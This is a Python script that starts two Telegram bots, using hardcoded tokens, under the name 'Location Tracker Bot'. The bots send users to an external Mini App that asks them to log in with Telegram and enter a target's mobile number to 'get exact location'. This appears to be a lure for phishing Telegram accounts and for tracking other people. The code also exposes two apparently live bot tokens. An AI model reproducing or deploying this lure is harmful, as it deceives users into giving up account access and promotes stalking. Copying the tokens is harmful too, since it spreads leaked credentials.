import telebot
# Added WebAppInfo to the imports
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import threading
import os
from flask import Flask

# Paste your bot tokens here
TOKENS = [
    "8668483286:AAHys6jHBSfz-2FrvEKRauB0SLGoSCxzdYA",
    "8716277413:AAGbu2U6eI4aR1vIYNKBncNlIZSMtbQUzJo"
]


# Put your Mini App URL here (Must start with https://)
MINI_APP_URL = "https://locationdata.onrender.com" 

def create_and_run_bot(token):
    """Function to initialize and run a single bot."""
    bot = telebot.TeleBot(token)

    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        markup = InlineKeyboardMarkup()
        
        # --- CHANGED: Now uses web_app instead of url ---
        open_button = InlineKeyboardButton(
            "🌟 Find Location 🌟", 
            web_app=WebAppInfo(url=MINI_APP_URL)
        )
        markup.add(open_button)

        # Engaging message using Markdown
        welcome_text = (
            "🚀 **Welcome to the Location Tracker Bot!** 🚀\n\n"
            "Here is how to get started:\n\n"
            "👉 **Step 1:** Click the Find Location button below.\n"
            "👉 **Step 2:** Login using Telegram.\n"
            "👉 **Step 3:** Enter Target Mobile Number.\n"
            "👉 **Step 4:** Get Exact Location!\n\n"
            "👇 *Click below to proceed* 👇"
        )

        bot.send_message(
            chat_id=message.chat.id,
            text=welcome_text,
            parse_mode='Markdown',
            reply_markup=markup
        )

    # Start the polling for this specific bot
    print(f"Bot with token ending in ...{token[-4:]} is starting.")
    bot.polling(none_stop=True)

# Loop through the tokens and start a background thread for each bot
for token in TOKENS:
    thread = threading.Thread(target=create_and_run_bot, args=(token,), daemon=True)
    thread.start()

# --- Render Web Service Requirement ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "All Telegram bots are running successfully!"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
